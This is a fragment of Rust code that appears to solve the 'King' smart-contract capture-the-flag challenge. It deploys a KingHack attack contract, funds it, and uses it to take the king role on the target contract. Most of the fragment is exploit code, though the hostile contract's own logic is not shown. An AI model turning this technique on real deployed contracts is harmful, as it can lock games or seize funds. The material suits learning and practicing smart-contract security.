use crate::abi::king_hack::KingHack;
...
impl ctf::Exploit for Exploit {
    ...
    async fn attack(
        ...
        let contract = King::new(target.address, offender.clone());
        let hack_contract =
            KingHack::deploy(offender.to_owned(), target.address)?
                .send()
                .await?;
        hack_contract
            .give_money()
            .value(100000000000000000000_i128)
            .send()
            .await?;
        hack_contract
            .to_be_the_king(contract.address())
            .value(100000000000000000000_i128)
            .gas(400000)
            .send()
            .await?;
